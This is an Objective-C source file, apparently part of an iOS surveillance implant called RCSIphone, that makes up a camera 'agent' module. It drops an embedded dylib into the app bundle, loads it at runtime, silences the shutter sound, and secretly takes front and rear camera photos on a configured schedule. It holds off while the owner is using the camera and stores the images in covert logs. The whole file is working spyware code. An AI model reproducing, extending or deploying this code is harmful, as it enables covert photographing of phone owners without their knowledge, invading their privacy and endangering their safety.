//
//  RCSIAgentCamera.m
//  RCSIphone
//
//  Created by kiodo on 02/12/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//
#import <dlfcn.h>
#import <AudioToolbox/AudioToolbox.h>

#import "RCSIAgentCamera.h"
#import "RCSILogManager.h"
#import "ARMHooker.h"

#import "RCSICameraSupport.h"

//#define DEBUG_CAMERA_

typedef NSData* (*camera_t) (NSInteger);
typedef void (*disableSound_t)(void);

static RCSIAgentCamera *sharedAgentCamera = nil;
static camera_t runCamera;
static disableSound_t disableShutterSound;

@implementation RCSIAgentCamera

@synthesize mAgentConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIAgentCamera *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedAgentCamera == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedAgentCamera;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
  if (sharedAgentCamera == nil)
    {
      sharedAgentCamera = [super allocWithZone: aZone];
      return sharedAgentCamera;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  return UINT_MAX;
}

- (void)release
{
 
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentCamera != nil)
      {
        self = [super init];
      
        if (self != nil)
          {
            sharedAgentCamera = self;            
          }
      } 
  }
  
  return sharedAgentCamera;
}

#define CAM_DYLIB_NAME @"camera.dylib"
#define CAM_DYLIB_FUNC "runCamera"

- (BOOL)_checkCameraCompatibilty
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;

  if (gOSMajor >= 4)
    {
#ifdef DEBUG_CAMERA
    NSLog(@"%s: running on iOS4", __FUNCTION__);
#endif
      NSString *path = [[NSBundle mainBundle] bundlePath];
      NSString *camDylibPathName = [[NSString alloc] initWithFormat: @"%@/%@", path, CAM_DYLIB_NAME];
      
#ifdef DEBUG_CAMERA
    NSLog(@"%s: stat dylib %@", __FUNCTION__, camDylibPathName);
#endif

      if (![[NSFileManager defaultManager] fileExistsAtPath: camDylibPathName])
        {
          NSData *tmpDylib = [[NSData alloc] initWithBytes: _tmp_camera_dylib_buff 
                                                    length: sizeof(_tmp_camera_dylib_buff)];
                                                    
          BOOL tmpB = FALSE;
          tmpB = [tmpDylib writeToFile: camDylibPathName atomically:YES];
                      
#ifdef DEBUG_CAMERA
          NSLog(@"%s: dylib write status %d", __FUNCTION__, tmpB);
#endif

          [tmpDylib release];
        }
      
      void *cam_handle = dlopen([camDylibPathName UTF8String], RTLD_NOW);
          
      if (cam_handle != NULL &&
          (runCamera = (camera_t) dlsym(cam_handle, CAM_DYLIB_FUNC)) != NULL &&
          (disableShutterSound = (disableSound_t) dlsym(cam_handle, "disableShutterSound")) != NULL)
        {
#ifdef DEBUG_CAMERA
          NSLog(@"%s: dylib export function found", __FUNCTION__);
#endif
          bRet = TRUE;
        }
        
      [camDylibPathName release];
    }  
    
  [pool release];
  
  return bRet;
}

- (void)_grabCameraShot
{
  if (gCameraActive == TRUE)
    return;
    
  //Front Log
  NSData *image = nil;
  
  image = runCamera(1);
  
  if (image != nil && [image isKindOfClass: [NSData class]])
    {
      RCSILogManager *logManager = [RCSILogManager sharedInstance];
      
      BOOL success = [logManager createLog: LOG_CAMERA
                               agentHeader: nil
                                 withLogID: 0];
      
      if (success == TRUE)
        {
          [logManager writeDataToLog: (NSMutableData*)image 
                            forAgent: LOG_CAMERA
                           withLogID: 0];
        }
        
    
      [logManager closeActiveLog: LOG_CAMERA
                     withLogID: 0];
                     
#ifdef DEBUG_CAMERA
    NSLog(@"%s:image 1 %#x ret count %d", __FUNCTION__, image, [image retainCount]);
#endif
      [image release];
    }
  
  if (gCameraActive == TRUE)
    return;
      
  // Rear log
  image = runCamera(2);
  
  if (image == nil)
    return;
  
  RCSILogManager *logManager = [RCSILogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_CAMERA
                           agentHeader: nil
                             withLogID: 0];
  
  if (success == TRUE)
    {
      [logManager writeDataToLog: (NSMutableData*)image 
                        forAgent: LOG_CAMERA
                       withLogID: 0];
    }
    
  [logManager closeActiveLog: LOG_CAMERA
                   withLogID: 0];
                   
#ifdef DEBUG_CAMERA
  NSLog(@"%s:image 2 %#x ret count %d", __FUNCTION__, image, [image retainCount]);
#endif

  [image release];
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  cameraStruct *conf;
  NSData *messageRawData;
  
  if ([self _checkCameraCompatibilty] == NO)
    {
#ifdef DEBUG_CAMERA_
      NSLog(@"%s: agent camera not compatibile on running device", __FUNCTION__);
#endif
      [outerPool release];
      return;
    }
 
  disableShutterSound();
  
  messageRawData = [mAgentConfiguration objectForKey: @"data"];
  conf = (cameraStruct *)[messageRawData bytes];

#ifdef DEBUG_CAMERA_
  if (conf)
    NSLog(@"%s: agent camera timeStep %lu, numStep %lu", __FUNCTION__,
          conf->timeStep, conf->numStep);
#endif

  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];  
  
  UInt32 cam_timeout = 0;
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      // New configurations
      if (conf->numStep == 0xFFFFFFFF)
        {
#ifdef DEBUG_CAMERA_
          NSLog(@"%s: agent camera grabbing one shot", __FUNCTION__);
#endif
          [self _grabCameraShot];
          [mAgentConfiguration setObject: AGENT_STOP forKey:@"status"];
          break;
        }
      else if (cam_timeout == 0) 
        {
          for (int i=0; i < conf->numStep; i++) 
            {
              if ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
                  [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
                [self _grabCameraShot];
              else
                break;
            }
            
          cam_timeout = conf->timeStep/1000;
        }
      else
        {
          sleep(1);
          cam_timeout--;
        }
    
      [innerPool release];
    }
    
  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
    {
      [mAgentConfiguration setObject: AGENT_STOPPED
                              forKey: @"status"];
    }
    
#ifdef DEBUG_CAMERA_
    NSLog(@"%s: agent camera stopped", __FUNCTION__);
#endif
  
  [mAgentConfiguration release];
  mAgentConfiguration = nil;
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  while (internalCounter <= MAX_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
